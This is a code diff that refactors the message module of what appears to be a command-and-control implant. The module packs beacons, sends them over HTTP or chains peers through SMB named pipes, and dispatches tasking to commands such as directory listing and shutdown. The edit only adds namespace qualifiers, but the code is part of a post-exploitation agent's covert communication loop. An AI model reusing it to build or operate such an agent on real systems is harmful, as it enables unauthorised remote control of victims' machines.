@@ -1,16 +1,11 @@
 #include <core/include/message.hpp>
 namespace Message {
-    using namespace Commands;
-    using namespace Stream;
-    using namespace Parser;
-    using namespace Http;
-    using namespace Smb;
 
     RDATA_SECTION COMMAND_MAP CmdMap[] = {
-        { .Id = CommandDir,         .Function = DirectoryList },
-        { .Id = CommandMods,        .Function = ProcessModules },
-        { .Id = CommandUpdatePeer,  .Function = UpdatePeer },
-        { .Id = CommandShutdown,    .Function = Shutdown },
+        { .Id = CommandDir,         .Function = Commands::DirectoryList },
+        { .Id = CommandMods,        .Function = Commands::ProcessModules },
+        { .Id = CommandUpdatePeer,  .Function = Commands::UpdatePeer },
+        { .Id = CommandShutdown,    .Function = Commands::Shutdown },
         { .Id = 0,                  .Function = nullptr }
     };
 
@@ -68,7 +63,7 @@ namespace Message {
 
                 Swap = Head;
                 Head = Head->Next;
-                DestroyStream(Swap);
+                Stream::DestroyStream(Swap);
 
             } else {
                 Prev = Head;
@@ -113,14 +108,14 @@ namespace Message {
             x_memcpy(&PeerId, Buffer, 4);
             x_memcpy(&TaskId, Buffer + 4, 4);
 
-            PackDword(Swap, PeerId);
-            PackDword(Swap, TaskId);
-            PackDword(Swap, TypeSegment);
+            Stream::PackDword(Swap, PeerId);
+            Stream::PackDword(Swap, TaskId);
+            Stream::PackDword(Swap, TypeSegment);
 
-            PackDword(Swap, Index);
-            PackDword(Swap, nSegs);
-            PackDword(Swap, cbSeg);
-            PackBytes(Swap, B_PTR(Buffer) + Offset, cbSeg);
+            Stream::PackDword(Swap, Index);
+            Stream::PackDword(Swap, nSegs);
+            Stream::PackDword(Swap, cbSeg);
+            Stream::PackBytes(Swap, B_PTR(Buffer) + Offset, cbSeg);
 
             Index++;
             Length -= cbSeg;
@@ -133,7 +128,7 @@ namespace Message {
     VOID MessageTransmit() {
         HEXANE
 
-        PSTREAM Outbound    = CreateStreamWithHeaders(TypeResponse);
+        PSTREAM Outbound    = Stream::CreateStreamWithHeaders(TypeResponse);
         PSTREAM Inbound     = { };
         PSTREAM Head        = { };
         PSTREAM Swap        = { };
@@ -141,10 +136,10 @@ namespace Message {
         if (!Ctx->Transport.OutboundQueue->Buffer) {
 
 #ifdef TRANSPORT_HTTP
-            // PackDword(Outbound, 0);
-            PackDword(Outbound, Ctx->Session.PeerId);
-            PackDword(Outbound, Ctx->Session.CurrentTaskId);
-            PackDword(Outbound, TypeTasking);
+            // Stream::PackDword(Outbound, 0);
+            Stream::PackDword(Outbound, Ctx->Session.PeerId);
+            Stream::PackDword(Outbound, Ctx->Session.CurrentTaskId);
+            Stream::PackDword(Outbound, TypeTasking);
 #else
             return_defer(ERROR_SUCCESS);
 #endif
@@ -157,7 +152,7 @@ namespace Message {
             }
 
             if (Head->Buffer) {
-                PackBytes(Outbound, B_PTR(Head->Buffer), Head->Length);
+                Stream::PackBytes(Outbound, B_PTR(Head->Buffer), Head->Length);
                 Head->Ready = TRUE;
             }
             else {
@@ -168,13 +163,13 @@ namespace Message {
         }
 
 #ifdef TRANSPORT_HTTP
-        HttpCallback(Outbound, &Inbound);
+        Http::HttpCallback(Outbound, &Inbound);
 #endif
 #ifdef TRANSPORT_PIPE
-        PeerConnectEgress(Outbound, &Inbound);
+        Smb::PeerConnectEgress(Outbound, &Inbound);
 #endif
 
-        DestroyStream(Outbound);
+        Stream::DestroyStream(Outbound);
         Outbound = nullptr;
 
         if (Inbound) {
@@ -182,7 +177,7 @@ namespace Message {
 
             if (PeekPID(Inbound)) {
                 CommandDispatch(Inbound);
-                DestroyStream(Inbound);
+                Stream::DestroyStream(Inbound);
 
             } else {
                 Swap = Inbound;
@@ -190,14 +185,14 @@ namespace Message {
                 Outbound = Swap;
 
                 if (Ctx->Config.IngressPipename) {
-                    PeerConnectIngress(Outbound, &Inbound);
+                    Smb::PeerConnectIngress(Outbound, &Inbound);
 
                     if (Inbound) {
                         OutboundQueue(Inbound);
                     }
                 }
 
-                DestroyStream(Outbound);
+                Stream::DestroyStream(Outbound);
             }
         } else {
             Head = Ctx->Transport.OutboundQueue;
@@ -218,11 +213,11 @@ namespace Message {
         ULONG MsgType   = 0;
         ULONG CmdId     = 0;
 
-        CreateParser(&Parser, B_PTR(Inbound->Buffer), Inbound->Length);
+        Parser::CreateParser(&Parser, B_PTR(Inbound->Buffer), Inbound->Length);
 
-        Ctx->Session.PeerId         = UnpackDword(&Parser);
-        Ctx->Session.CurrentTaskId  = UnpackDword(&Parser);
-        MsgType                     = UnpackDword(&Parser);
+        Ctx->Session.PeerId         = Parser::UnpackDword(&Parser);
+        Ctx->Session.CurrentTaskId  = Parser::UnpackDword(&Parser);
+        MsgType                     = Parser::UnpackDword(&Parser);
 
         switch (MsgType) {
 
@@ -232,7 +227,7 @@ namespace Message {
             }
 
             case TypeTasking: {
-                CmdId = UnpackDword(&Parser);
+                CmdId = Parser::UnpackDword(&Parser);
                 if (CmdId == CommandNoJob) {
                     break;
                 }
@@ -254,6 +249,6 @@ namespace Message {
         }
 
         defer:
-        DestroyParser(&Parser);
+        Parser::DestroyParser(&Parser);
     }
 }
